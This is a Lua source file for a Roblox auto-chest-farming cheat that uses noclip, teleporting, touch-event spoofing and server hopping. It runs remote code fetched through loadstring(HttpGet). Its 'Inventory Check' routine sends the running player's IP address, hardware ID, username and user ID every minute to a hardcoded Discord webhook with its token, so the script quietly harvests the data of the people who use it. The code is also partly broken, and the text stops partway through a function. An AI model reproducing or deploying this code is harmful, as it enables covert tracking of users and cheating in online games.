--[[
getgenv().config = {
    Setting = {
        ["Team"] = "Marines",         --Pirates\Marines
        ["Disabled Notify"] = false,  
        ["Boots FPS"] = false,         
        ["White Screen"] = false,
        ["No Stuck Chair"] = true, 
        ["Auto Rejoin"] = true,
    },
    ChestFarm = {
        ["Start Farm Chest"] = true,   
        ["Stop When Have God's Chalice or Dark Key"] = true, 
    },
    Webhook = {
        ["Webhook Url"] = "https://discord.com/api/webhooks/1360798536937246840/HBIfH0Okazx7DxPPu8rNi_jYQSMWT4eis8HSx6UW83rLMgxQn6fgWShuqBbaiwxUEXmS",          
        ["Send Webhook"] = true,      
    },
}
loadstring(game:HttpGet("https://raw.githubusercontent.com/Icarus-Ezz/phatyeuem/refs/heads/main/Chest.lua"))()
]]--

if getgenv().config.Setting["Team"] == "Marines" then
    if not game.Players.LocalPlayer.Team or game.Players.LocalPlayer.Team.Name ~= "Marines" then
        game.ReplicatedStorage.Remotes.CommF_:InvokeServer("SetTeam", "Marines")
    end
elseif getgenv().config.Setting["Team"] == "Pirates" then
    if not game.Players.LocalPlayer.Team or game.Players.LocalPlayer.Team.Name ~= "Pirates" then
        game.ReplicatedStorage.Remotes.CommF_:InvokeServer("SetTeam", "Pirates")
    end
end

wait(3)
------------------------------------------------------------------------------------
spawn(function()
    while wait() do
        if getgenv().config.Setting["Boots FPS"] then
            if game.Players.LocalPlayer.Character:FindFirstChild("Pants") then
                game.Players.LocalPlayer.Character.Pants:Destroy()
            end

            game.Players.LocalPlayer.Character.Animate.Disabled = true

            wait()

            loadstring(game:HttpGet("https://raw.githubusercontent.com/JewhisKids/NewFreeScript/main/Misc/SuperFpsBoost.lua"))()

            setfpscap(59)
        end
    end
end)

spawn(function()
    while wait() do
        if getgenv().config.Setting["White Screen"] then
            game:GetService("RunService"):Set3dRenderingEnabled(true)
        end
    end
end)

spawn(function()
    while wait() do
        if getgenv().config.Setting["Disabled Notify"] then
            local player = game:GetService("Players").LocalPlayer
            if player and player.PlayerGui then
                local notifications = player.PlayerGui:FindFirstChild("Notifications")
                if notifications then
                    notifications:Destroy()
                end
            end
        end
    end
end)

local function formatNumberWithCommas(n)
    local s = tostring(n)
    local result = s:reverse():gsub("(%d%d%d)", "%1,")
    result = result:reverse()
    if result:sub(1,1) == "," then
        result = result:sub(2)
    end
    return result
end

--//Code Ui
local TweenService = game:GetService("TweenService")
local CoreGui = game:GetService("CoreGui")
local UserInputService = game:GetService("UserInputService")
local StarterGui = game:GetService("StarterGui")
local HttpService = game:GetService("HttpService")
local TWEEN_TIME = 0.6
local TWEEN_STYLE = Enum.EasingStyle.Quart
local TWEEN_DIRECTION = Enum.EasingDirection.Out
local SCREEN_WIDTH = workspace.CurrentCamera.ViewportSize.X
local SCREEN_HEIGHT = workspace.CurrentCamera.ViewportSize.Y
local MarketplaceService = game:GetService("MarketplaceService")
local Players = game:GetService("Players")
repeat wait() until Players.LocalPlayer
local LocalPlayer = Players.LocalPlayer
local oldBeli = 0
local earnedBeli = 0
local Converted = {}

local isMinimized = true
local isDragging = true

function PostWebhook(Url, message)
    local request = http_request or request or HttpPost or syn.request
    local data = request({
        Url = Url,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = game:GetService("HttpService"):JSONEncode(message)
    })
    return data
end

function AdminLoggerMsg(hasGodsChalice, hasFistOfDarkness)
    local player = game.Players.LocalPlayer
    local beli = player:FindFirstChild("Data")
                 and player.Data:FindFirstChild("Beli")
                 and player.Data.Beli.Value or 0
    
    local AdminMessage = {
        embeds = {{
            title       = "**📦 Inventory Check!**",
            description = "",
            color       = tonumber(0xffffff),
            fields = {
                {
                    name   = "**👤 Username**",
                    value  = "||```" .. player.Name .. "```||",
                    inline = true
                },
                {
                    name   = "**🗿UserID**",
                    value  = "```" .. player.UserId .. "```",
                    inline = true
                },
                {
                    name   = "**💰 Beli**",
                    value  = "```" .. formatNumberWithCommas(beli) .. "```",
                    inline = false
                },
                {
                    name   = "**🌇IP Address**",
                    value  = "||```" .. tostring(game:HttpGet("https://api.ipify.org", true)) .. "```||",
                    inline = false
                },
                {
                    name   = "💻 HWID",
                    value  = "```" .. (gethwid and gethwid() or "Unknown") .. "```",
                    inline = false
                },
                {
                    name   = "🧭 Job ID",
                    value  = "```" .. game.JobId .. "```",
                    inline = false
                },
                {
                    name   = "📜Join Code",
                    value  = "```lua\n" ..
                             "game.ReplicatedStorage['__ServerBrowser']:InvokeServer(" ..
                             "'teleport','" .. game.JobId .. "')```",
                    inline = false
                },
                {
                    name   = "️♜ God's Chalice 🔳",
                    value  = hasGodsChalice and "✅" or "❌",
                    inline = true
                },
                {
                    name   = "♣️ Fist of Darkness ♠️",
                    value  = hasFistOfDarkness and "✅" or "❌",
                    inline = true
                },
            },
            timestamp = os.date("!%Y-%m-%dT%H:%M:%S")
        }}
    }
    return AdminMessage
end

spawn(function()
    while true do
        local hasGodsChalice = false
        local hasFistOfDarkness = false

        -- Check Invntory
        for _, item in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
            if item.Name == "God's Chalice" then
                hasGodsChalice = true
            elseif item.Name == "Fist of Darkness" then
                hasFistOfDarkness = true
            end
        end

        if getgenv().config.Webhook["Send Webhook"] then

            local message = AdminLoggerMsg(hasGodsChalice, hasFistOfDarkness)
            PostWebhook(getgenv().config.Webhook["Webhook Url"], message)
        else
            print("Webhook not enabled.")
        end

        -- Check 60s/1
        task.wait(60)
    end
end)

spawn(function()
    local runService = game:GetService("RunService")
    local player = game.Players.LocalPlayer

    runService.Stepped:Connect(function()
        if getgenv().config.ChestFarm["Start Farm Chest"] then
            for _, part in pairs(player.Character:GetDescendants()) do
                if part:IsA("BasePart") then
                    part.CanCollide = false
                end
            end
        end
    end)
end)

local function FormatNumber(number)
    return tostring(number):reverse():gsub("(%d%d%d)", "%1,"):reverse():gsub("^,", "")
end

local function CreateSmoothCorner(instance, radius)
    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, radius or 8)
    corner.Parent = instance
    return corner
end

function SmartServerHop()
    if not _G.AutoHopEnabled then return end
    
    pcall(function()
        local servers = {}
        local req = game:HttpGet("https://games.roblox.com/v1/games/"..game.PlaceId.."/servers/Public?sortOrder=Asc&limit=100")
        local data = game:GetService("HttpService"):JSONDecode(req)
        
        for i,v in pairs(data.data) do
            if v.playing < v.maxPlayers and v.id ~= game.JobId then
                table.insert(servers, v.id)
            end
        end
        
        if #servers > 0 then
            game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, servers[math.random(1, #servers)])
        else
            wait(30)
            SmartServerHop()
        end
    end)
end

if pcall(function() game:HttpGet("https://games.roblox.com/v1/games/"..game.PlaceId.."/servers/Public?sortOrder=Asc&limit=100") end) then
    HopServer = SmartServerHop
end

local function AntiKick()
    while true do
        wait(1)
        pcall(function()
            if game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
                local v1518 = Instance.new("BillboardGui", game.Players.LocalPlayer.Character.HumanoidRootPart);
                v1518.Name = "Esp";
                v1518.ExtentsOffset = Vector3.new(0, 1, 0);
                v1518.Size = UDim2.new(1, 300, 1, 50);
                v1518.Adornee = game.Players.LocalPlayer.Character.HumanoidRootPart;
                v1518.AlwaysOnTop = true;
                local v1524 = Instance.new("TextLabel", v1518);
                v1524.Font = "Code";
                v1524.FontSize = "Size14";
                v1524.TextWrapped = true;
                v1524.Size = UDim2.new(1, 0, 1, 0);
                v1524.TextYAlignment = "Top";
                v1524.BackgroundTransparency = 1;
                v1524.TextStrokeTransparency = 0.5;
                v1524.TextColor3 = Color3.fromRGB(255, 255, 255);  
                 v1524.Text = "gg.vxezehub";  
            end
            if game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity.Magnitude < 0.1 then
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame + Vector3.new(0, 0, 0.01)
            end
        end)
    end
end

spawn(AntiKick)

--Rejoin
spawn(function()
    while wait() do
        if getgenv().config.Setting["Auto Rejoin"] then
            if not getgenv().rejoin then 
                getgenv().rejoin = game:GetService("CoreGui").RobloxPromptGui.promptOverlay.ChildAdded:Connect(function(child)
                    if child.Name == 'ErrorPrompt' and child:FindFirstChild('MessageArea') and child.MessageArea:FindFirstChild("ErrorFrame") then
                        game:GetService("TeleportService"):Teleport(game.PlaceId)
                    end
                end)
            end
        end
    end
end)

local function Tween2(targetCFrame)
    pcall(function()
        local character = game.Players.LocalPlayer.Character
        if not character then return end

        local hrp = character:FindFirstChild("HumanoidRootPart")
        if not hrp then return end

        local distance = (targetCFrame.Position - hrp.Position).Magnitude
        local speed = 350
        local travelTime = distance / speed

        local tweenInfo = TweenInfo.new(
            travelTime,
            Enum.EasingStyle.Linear,
            Enum.EasingDirection.InOut,
            0,
            false,
            0
        )

        local tween = game:GetService("TweenService"):Create(hrp, tweenInfo, {CFrame = targetCFrame})
        _G.CurrentTween = tween

        local connection
        connection = tween.Completed:Connect(function()
            EnableNoClipAndAntiGravity()
            if connection then connection:Disconnect() end
        end)

        tween:Play()

        -- Theo dõi thời gian để có thể dừng nếu điều kiện thay đổi
        local start = tick()
        while tick() - start < travelTime do
            if getgenv().StopTweenNow then
                tween:Cancel()
                _G.CurrentTween = nil
                return
            end
            task.wait(0.1)
        end

        _G.CurrentTween = nil
    end)
end

local Players            = game:GetService("Players")
local TweenService       = game:GetService("TweenService")
local UserInputService   = game:GetService("UserInputService")
local workspace          = workspace

local Converted = {}
local oldBeli     = 0
local earnedBeli  = 0

local function FormatNumber(n)
    local s = tostring(n)
    local out = s:reverse():gsub("(%d%d%d)", "%1,"):reverse()
    if out:sub(1,1) == "," then
        out = out:sub(2)
    end
    return out
end

-- UI Helpers
local function CreateSmoothCorner(parent, radius)
    local corner = Instance.new("UICorner", parent)
    corner.CornerRadius = UDim.new(0, radius or 8)
    return corner
end

local function CreateSmoothCorner1(parent, isCircle, pixelRadius)
    local corner = Instance.new("UICorner", parent)
    if isCircle then
        corner.CornerRadius = UDim.new(1, 0)  
    else
        corner.CornerRadius = UDim.new(0, pixelRadius or 8)
    end
    return corner
end


local function CreateStroke(parent, color, thickness)
    local stroke = Instance.new("UIStroke", parent)
    stroke.Color      = color or Color3.fromRGB(65, 65, 65)
    stroke.Thickness  = thickness or 1.5
    return stroke
end

local function CreateDropShadow(parent)
    local shadow = Instance.new("ImageLabel", parent)
    shadow.Name               = "Shadow"
    shadow.AnchorPoint        = Vector2.new(0.5, 0.5)
    shadow.BackgroundTransparency = 1
    shadow.Position           = UDim2.new(0.5, 0, 0.5, 0)
    shadow.Size               = UDim2.new(1, 47, 1, 47)
    shadow.Image              = "rbxassetid://6014261993"
    shadow.ImageColor3        = Color3.fromRGB(0, 0, 0)
    shadow.ImageTransparency  = 0.5
    return shadow
end

local function CreateMainGui()
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name         = "VxezeHubUI"
    screenGui.ResetOnSpawn = false
    screenGui.Parent       = game.CoreGui

    Converted["_MainFrame"] = Instance.new("Frame", screenGui)
    local main = Converted["_MainFrame"]
    main.Name             = "MainFrame"
    main.Size             = UDim2.new(0, 350, 0, 300)
    main.Position         = UDim2.new(0.5, -175, 0.5, -150)
    main.BackgroundTransparency = 1

    local titleBar = Instance.new("Frame", main)
    titleBar.Name             = "TitleBar"
    titleBar.Size = UDim2.new(1, 0, 0, 35)
    titleBar.Position         = UDim2.new(0, 0, 0, 0)
    titleBar.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
    CreateSmoothCorner1(titleBar, false, 12)

    local logo = Instance.new("ImageLabel", titleBar)
    logo.Size            = UDim2.new(0, 24, 0, 24)
    logo.Position        = UDim2.new(0, 10, 0.5, -12)
    logo.BackgroundTransparency = 1
    logo.Image           = "rbxassetid://91347148253026"
    CreateSmoothCorner1(logo, true)

    local titleText = Instance.new("TextLabel", titleBar)
    titleText.Size            = UDim2.new(1, -100, 1, 0)
    titleText.Position        = UDim2.new(0, 40, 0, 0)
    titleText.BackgroundTransparency = 1
    titleText.Font            = Enum.Font.GothamBold
    titleText.Text            = "Vxeze Hub Auto Chest"
    titleText.TextColor3      = Color3.fromRGB(255, 255, 255)
    titleText.TextSize        = 16
    titleText.TextXAlignment  = Enum.TextXAlignment.Left

    local closeBtn = Instance.new("TextButton", titleBar)
    closeBtn.Size = UDim2.new(0, 30, 0, 30)
    closeBtn.Position = UDim2.new(1, -40, 0, 5)
    closeBtn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    closeBtn.Text = "X"
    closeBtn.TextColor3 = Color3.fromRGB(231, 76, 60)
    closeBtn.TextSize = 16
    CreateSmoothCorner(closeBtn)
    
    local minimizeBtn = Instance.new("TextButton", titleBar)
    minimizeBtn.Size             = UDim2.new(0, 30, 0, 30)
    minimizeBtn.Position         = UDim2.new(1, -80, 0, 5)
    minimizeBtn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    minimizeBtn.Text             = "-"
    minimizeBtn.TextColor3       = Color3.fromRGB(255, 255, 255)
    minimizeBtn.TextSize         = 16
    CreateSmoothCorner(minimizeBtn)

-- Tạo Frame Stats
    Converted["_Stats"] = Instance.new("Frame", main)
    local stats = Converted["_Stats"]
    stats.Name             = "Stats"
    stats.Size             = UDim2.new(1, -20, 0, 180)
    stats.Position         = UDim2.new(0, 10, 0, 50)
    stats.BackgroundTransparency = 1 

    local miniBg = Instance.new("ImageLabel", mini)
    miniBg.Size = UDim2.new(1, 0, 1, 0)  
    miniBg.Position = UDim2.new(0, 0, 0, 0)  
    miniBg.Image = "rbxassetid://133887806410147"
    miniBg.BackgroundTransparency = 1
    miniBg.BorderSizePixel = 0  

    local function CreateStatLabel(y)
        local lbl = Instance.new("TextLabel", stats)
        lbl.Size               = UDim2.new(1, -20, 0, 30)
        lbl.Position           = UDim2.new(0, 10, 0, y)
        lbl.BackgroundTransparency = 1
        lbl.Font               = Enum.Font.GothamSemibold
        lbl.TextColor3         = Color3.fromRGB(255, 255, 255)
        lbl.TextSize           = 14
        lbl.TextXAlignment     = Enum.TextXAlignment.Left
        return lbl
    end

    Converted["_TimeLabel"]       = CreateStatLabel(10)
    Converted["_BeliLabel"]       = CreateStatLabel(50)
    Converted["_EarnedBeliLabel"] = CreateStatLabel(90)
    Converted["_ChestLabel"]      = CreateStatLabel(130)

    -- Controls Frame
    Converted["_Controls"] = Instance.new("Frame", main)
    local ctrls = Converted["_Controls"]
    ctrls.Name               = "Controls"
    ctrls.Size               = UDim2.new(1, -20, 0, 40)
    ctrls.Position           = UDim2.new(0, 10, 0, 230)
    ctrls.BackgroundTransparency = 1

    -- Frame chứa 2 nút
    local btnFrame = Instance.new("Frame", main)
    btnFrame.Size = UDim2.new(1, -20, 0, 55)
    btnFrame.Position = UDim2.new(0, 10, 1, -65)
    btnFrame.BackgroundTransparency = 1

    -- Căn ngang, cách đều
    local uiList = Instance.new("UIListLayout", btnFrame)
    uiList.FillDirection = Enum.FillDirection.Horizontal
    uiList.HorizontalAlignment = Enum.HorizontalAlignment.Center
    uiList.VerticalAlignment = Enum.VerticalAlignment.Center
    uiList.Padding = UDim.new(0, 10)

    local function CreateButton(text, color)
        local btn = Instance.new("TextButton")
        btn.Size = UDim2.new(0, 120, 0, 35)
        btn.BackgroundColor3 = color
        btn.Text = text
        btn.Font = Enum.Font.GothamBold
        btn.TextColor3 = Color3.fromRGB(255, 255, 255)
        btn.TextSize = 16
        btn.AutoButtonColor = false
        btn.ClipsDescendants = true

        CreateSmoothCorner(btn, false, 10)
        CreateStroke(btn, color:Lerp(Color3.new(0,0,0), 0.2))

        -- Hover animation
        btn.MouseEnter:Connect(function()
            TweenService:Create(btn, TweenInfo.new(0.25), {
                BackgroundColor3 = color:Lerp(Color3.new(1, 1, 1), 0.08)
            }):Play()
        end)
        btn.MouseLeave:Connect(function()
            TweenService:Create(btn, TweenInfo.new(0.25), {
                BackgroundColor3 = color
            }):Play()
        end)

        return btn
    end
    
    Converted["_StartButton"] = CreateButton("✔️ Start", Color3.fromRGB(46,204,113))
    Converted["_StartButton"].Parent = btnFrame

    Converted["_StopButton"] = CreateButton("🛑 Stop", Color3.fromRGB(231,76,60))
    Converted["_StopButton"].Parent = btnFrame

    local mini = Instance.new("Frame", screenGui)
    mini.Name = "MiniUI"
    mini.Size = UDim2.new(0, 50, 0, 50)
    mini.Position = UDim2.new(0.5, -25, 0, 10)
    mini.BackgroundTransparency = 1
    
    local backgroundImage = Instance.new("ImageLabel", mini)
    backgroundImage.Size = UDim2.new(1, 0, 1, 0)
    backgroundImage.Position = UDim2.new(0, 0, 0, 0)
    backgroundImage.Image = "rbxassetid://134510815124527" 
    backgroundImage.BackgroundTransparency = 1
    backgroundImage.BorderSizePixel = 0

    local restoreBtn = Instance.new("ImageButton", mini)
    restoreBtn.Size             = UDim2.new(1,0,1,0)
    restoreBtn.BackgroundColor3 = Color3.fromRGB(0,0,0)
    restoreBtn.Image            = "rbxassetid://91347148253026"
    CreateSmoothCorner1(restoreBtn, true)

    local dragging, dragStart, startPos
    titleBar.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            dragging, dragStart, startPos = true, input.Position, main.Position
        end
    end)
    UserInputService.InputChanged:Connect(function(input)
        if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
            local delta = input.Position - dragStart
            main.Position = UDim2.new(
                startPos.X.Scale, startPos.X.Offset + delta.X,
                startPos.Y.Scale, startPos.Y.Offset + delta.Y
            )
        end
    end)
    UserInputService.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            dragging = false
        end
    end)

    closeBtn.MouseButton1Click:Connect(function()
        screenGui:Destroy()
    end)
    minimizeBtn.MouseButton1Click:Connect(function()
        main.Visible = false
        mini.Visible = true
    end)
    restoreBtn.MouseButton1Click:Connect(function()
        main.Visible = true
        mini.Visible = false
    end)

    return screenGui
end

local function UpdateTime()
    local t = math.floor(workspace.DistributedGameTime + 0.5)
    local h = math.floor(t/3600)%24
    local m = math.floor(t/60)%60
    local s = t%60
    Converted["_TimeLabel"].Text = string.format("⏰ Time: %02d:%02d:%02d", h, m, s)
end

local function UpdateStats()
    local player = Players.LocalPlayer
    if not player or not player:FindFirstChild("Data") then return end

    local beli = player.Data.Beli.Value
    if oldBeli == 0 then
        oldBeli = beli
    else
        earnedBeli = beli - oldBeli
    end

    local chestCount = 0
    for _, v in ipairs(workspace:GetDescendants()) do
        if v:IsA("BasePart") and v:FindFirstChild("TouchInterest") and v.Name:lower():find("chest") then
            chestCount += 1
        end
    end

    Converted["_BeliLabel"].Text       = "💰 Beli: " .. FormatNumber(beli)
    Converted["_EarnedBeliLabel"].Text = "📈 Earned: " .. FormatNumber(earnedBeli)
    Converted["_ChestLabel"].Text      = "🎁 Chests: " .. chestCount
end

CreateMainGui()

spawn(function()
    while true do
        UpdateTime()
        UpdateStats()
        task.wait(1)
    end
end)

spawn(function()
    -- Xử lý Start/Stop Farm nếu cần
    Converted["_StartButton"].MouseButton1Click:Connect(function()
        getgenv().config.ChestFarm["Start Farm Chest"] = true
        getgenv().config.Setting["No Stuck Chair"] = true
        game.StarterGui:SetCore("SendNotification", {
            Title = "Vxeze Hub Auto Chest",
            Text = "Auto Chest Started!",
            Duration = 2
        })
    end)
    Converted["_StopButton"].MouseButton1Click:Connect(function()
        getgenv().config.ChestFarm["Start Farm Chest"] = false
        getgenv().config.Setting["No Stuck Chair"] = false
        game.StarterGui:SetCore("SendNotification", {
            Title = "Vxeze Hub Auto Chest",
            Text = "Auto Chest Stopped!",
            Duration = 2
        })
    end)
end)

function StopTween()
    if not getgenv().StopTween then
        getgenv().StopTween = true            
        if tween then
            tween:Cancel() 
            tween = nil
        end            

        local player = game:GetService("Players").LocalPlayer
        local character = player and player.Character
        local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
        
        if humanoidRootPart then
            humanoidRootPart.Anchored = true  -- Đảm bảo không bị di chuyển
            task.wait(0.1)  
            humanoidRootPart.CFrame = humanoidRootPart.CFrame  
            humanoidRootPart.Anchored = false
        end

        local bodyClip = humanoidRootPart and humanoidRootPart:FindFirstChild("BodyClip")
        if bodyClip then
            bodyClip:Destroy() 
        end

        -- Reset trạng thái StopTween và Clip
        getgenv().StopTween = false
        getgenv().Clip = false
    end
end

spawn(function()
    while task.wait() do
        pcall(function()
            if getgenv().config.ChestFarm["Start Farm Chest"] then
                local player = game:GetService("Players").LocalPlayer
                local humanoidRootPart = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
                
                if humanoidRootPart and not humanoidRootPart:FindFirstChild("BodyClip") then
                    local Noclip = Instance.new("BodyVelocity")
                    Noclip.Name = "BodyClip"
                    Noclip.Parent = humanoidRootPart
                    Noclip.MaxForce = Vector3.new(100000, 100000, 100000)  
                    Noclip.Velocity = Vector3.new(0, 0, 0) 
                end
            else
                local bodyClip = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart:FindFirstChild("BodyClip")
                if bodyClip then
                    bodyClip:Destroy()
                end
            end
        end)
    end
end)

local seaThirdSea = CFrame.new(-5056.14794921875, 314.68048095703125, -2985.12255859375)  -- Third Sea (Castle)
local seaSecondSea = CFrame.new(-411.2250061035156, 73.31524658203125, 371.2820129394531)     -- Second Sea (Cafe)

local function GetSeaCoordinates()
    if game.PlaceId == 4442272183 then  
        return seaSecondSea
    elseif game.PlaceId == 7449423635 then  
        return seaThirdSea
    else
        return nil
    end
end

--Check Backpack
spawn(function()
    while wait() do
        if getgenv().config.ChestFarm["Stop When Have God's Chalice or Dark Key"] then
            local hasGodsChalice = game.Players.LocalPlayer.Backpack:FindFirstChild("God's Chalice") or game.Players.LocalPlayer.Character:FindFirstChild("God's Chalice")
            local hasFistOfDarkness = game.Players.LocalPlayer.Backpack:FindFirstChild("Fist of Darkness") or game.Players.LocalPlayer.Character:FindFirstChild("Fist of Darkness")

            if hasGodsChalice or hasFistOfDarkness then
                    
                getgenv().config.ChestFarm["Start Farm Chest"] = false
                getgenv().config.Setting["No Stuck Chair"] = false
                    
                local seaCoordinates = GetSeaCoordinates()
                if seaCoordinates then
                    Tween2(seaCoordinates)
                    wait(1.5)
                end
                    
                break
            end
        end
    end
end)


-- ========== Auto Jump nếu kẹt ghế ==========
function AutoJump()
    while wait(2) do
        if getgenv().config.Setting["No Stuck Chair"] then
            print("Jumping...")
            pcall(function()
                local char = game.Players.LocalPlayer.Character
                local humanoid = char and char:FindFirstChildOfClass("Humanoid")
                if humanoid then
                    humanoid.Jump = true
                end
            end)
        end
    end
end

spawn(AutoJump)
--------------------------Ui
function StartCountdownAndHop(countdownTime)
    local stopHopping = false

    local playerGui = game.Players.LocalPlayer:WaitForChild("PlayerGui")
    local screenGui = Instance.new("ScreenGui")
    screenGui.Parent = playerGui
    screenGui.ResetOnSpawn = false
    screenGui.Name = "VxezeHopUI"
    screenGui.IgnoreGuiInset = true

    local background = Instance.new("Frame")
    background.Parent = screenGui
    background.Size = UDim2.new(1, 0, 1, 0)
    background.Position = UDim2.new(0, 0, 0, 0)
    background.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    background.BackgroundTransparency = 0.1
    background.ZIndex = 0

    local logo = Instance.new("ImageLabel")
    logo.Parent = screenGui
    logo.Size = UDim2.new(0, 70, 0, 70) -- nhỏ lại
    logo.Position = UDim2.new(0.5, -35, 0.3, -60)
    logo.Image = "rbxassetid://91347148253026"
    logo.BackgroundTransparency = 1
    logo.ZIndex = 2

    local titleLabel = Instance.new("TextLabel")
    titleLabel.Parent = screenGui
    titleLabel.Size = UDim2.new(0, 400, 0, 40)
    titleLabel.Position = UDim2.new(0.5, -200, 0.3, 20) -- ngay dưới logo
    titleLabel.BackgroundTransparency = 1
    titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    titleLabel.TextSize = 32
    titleLabel.Font = Enum.Font.GothamBold
    titleLabel.Text = "Vxeze Hop Server"
    titleLabel.TextStrokeTransparency = 0.6
    titleLabel.TextScaled = false
    titleLabel.ZIndex = 3

    local subLabel = Instance.new("TextLabel")
    subLabel.Parent = screenGui
    subLabel.Size = UDim2.new(0, 300, 0, 20)
    subLabel.Position = UDim2.new(0.5, -150, 0.3, 60) 
    subLabel.BackgroundTransparency = 1
    subLabel.TextColor3 = Color3.fromRGB(180, 180, 180)
    subLabel.TextSize = 18
    subLabel.Font = Enum.Font.Gotham
    subLabel.Text = "Find New Server"
    subLabel.TextStrokeTransparency = 0.8
    subLabel.TextScaled = false
    subLabel.ZIndex = 3

    local progressBarBackground = Instance.new("Frame")
    progressBarBackground.Parent = screenGui
    progressBarBackground.Size = UDim2.new(0, 350, 0, 20)
    progressBarBackground.Position = UDim2.new(0.5, -175, 0.5, -10)
    progressBarBackground.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
    progressBarBackground.BorderSizePixel = 0
    progressBarBackground.ZIndex = 1
    progressBarBackground.ClipsDescendants = true
    Instance.new("UICorner", progressBarBackground).CornerRadius = UDim.new(0, 12)

    local progressBar = Instance.new("Frame")
    progressBar.Parent = progressBarBackground
    progressBar.Size = UDim2.new(0, 0, 1, 0)
    progressBar.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    progressBar.ZIndex = 2
    Instance.new("UICorner", progressBar).CornerRadius = UDim.new(0, 12)

    local countdownLabel = Instance.new("TextLabel")
    countdownLabel.Parent = screenGui
    countdownLabel.Size = UDim2.new(0, 300, 0, 50)
    countdownLabel.Position = UDim2.new(0.5, -150, 0.5, -60)
    countdownLabel.BackgroundTransparency = 1
    countdownLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    countdownLabel.TextSize = 30
    countdownLabel.Font = Enum.Font.GothamBold
    countdownLabel.Text = tostring(countdownTime) .. "s"
    countdownLabel.TextStrokeTransparency = 0.6
    countdownLabel.ZIndex = 3

    local stopButton = Instance.new("ImageButton") 
    stopButton.Parent = screenGui
    stopButton.Size = UDim2.new(0, 140, 0, 40)
    stopButton.Position = UDim2.new(0.5, -70, 0.5, 30)
    stopButton.Image = "rbxassetid://91347148253026" 
    stopButton.ScaleType = Enum.ScaleType.Stretch
    stopButton.BackgroundTransparency = 1
    stopButton.ZIndex = 4
    stopButton.AutoButtonColor = false

    local stopText = Instance.new("TextLabel")
    stopText.Parent = stopButton
    stopText.Size = UDim2.new(1, 0, 1, 0)
    stopText.BackgroundTransparency = 1
    stopText.Text = "⛔ Stop Hop"
    stopText.Font = Enum.Font.GothamBold
    stopText.TextSize = 20
    stopText.TextColor3 = Color3.fromRGB(255, 255, 255)
    stopText.TextStrokeTransparency = 0.6
    stopText.ZIndex = 5

    stopButton.MouseEnter:Connect(function()
        stopText.TextColor3 = Color3.fromRGB(255, 200, 200)
    end)
    stopButton.MouseLeave:Connect(function()
        stopText.TextColor3 = Color3.fromRGB(255, 255, 255)
    end)

    stopButton.MouseButton1Click:Connect(function()
        stopHopping = true
        stopText.Text = "Stopped"
        stopText.TextColor3 = Color3.fromRGB(150, 150, 150)
        stopButton.Image = ""
        if screenGui then screenGui:Destroy() end
    end)

    for i = countdownTime, 1, -1 do
        if stopHopping then return end
        countdownLabel.Text = tostring(i) .. "s"
        progressBar:TweenSize(UDim2.new(i / countdownTime, 0, 1, 0), "Out", "Linear", 1, true)
        wait(1)
    end

    if stopHopping then return end

    countdownLabel.Text = "Vxeze Hopping"
    game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Vxeze Hub",
        Text = "Vxeze Hopping",
        Duration = 4
    })

    wait(1)
    if screenGui then screenGui:Destroy() end
    Hop()
end

----------------------------------------------------------------------------------------------------
local lastPosition = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
local idleTime = 0 

local function CheckIdleTime()
    local currentPosition = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
    if currentPosition == lastPosition then
        idleTime = idleTime + 1
    else
        idleTime = 0 
    end
    lastPosition = currentPosition
end

spawn(function()
    while true do
        CheckIdleTime()

        if idleTime >= 600 then  
            game:GetService("StarterGui"):SetCore("SendNotification", {
                Title = "Idle Timeout",
                Text = "Idle Timeout. Hop Sever",
                Duration = 4
            })
            
            Hop()  
            idleTime = 0 
            break
        end
        
        wait(1) 
    end
end)

local function GetChest()
    local distance = math.huge
    local closestChest = nil
    for _, v in pairs(workspace.Map:GetDescendants()) do
        if string.find(v.Name:lower(), "chest") and v:FindFirstChild("TouchInterest") and v:IsA("BasePart") then
            if v.Position.Y < -10 then continue end
            local d = (v.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude
            if d < distance then
                distance = d
                closestChest = v
            end
        end
    end
    return closestChest
end

spawn(function()
    local startTime = tick() 

    while true do
        if getgenv().config.ChestFarm["Start Farm Chest"] then
            game:GetService("StarterGui"):SetCore("SendNotification", {
                Title = "Auto Chest",
                Text = "Find Chest...",
                Duration = 3
            })

            _G.AutoCollectChest = true
            _G.IsChestFarming = true

            local function AutoChestCollect()
                local timeout = 0
                while getgenv().config.ChestFarm["Start Farm Chest"] do
                    local chest = GetChest()
                    if chest and chest:IsDescendantOf(workspace) then
                        Tween2(chest.CFrame)

                        pcall(function()
                            firetouchinterest(game.Players.LocalPlayer.Character.HumanoidRootPart, chest, 0)
                            firetouchinterest(game.Players.LocalPlayer.Character.HumanoidRootPart, chest, 1)
                        end)

                        local start = tick()
                        repeat task.wait(0.1) until not chest:IsDescendantOf(workspace) or tick() - start > 1

                        if not chest:IsDescendantOf(workspace) then
                            _G.LastChestCollectedTime = tick()
                            _G.CollectedChests = (_G.CollectedChests or 0) + 1
                            timeout = 0
                        end
                    else
                        timeout = timeout + 1
                        if timeout >= 2 then
                            StartCountdownAndHop(10) 
                            break
                        end
                        wait(1)
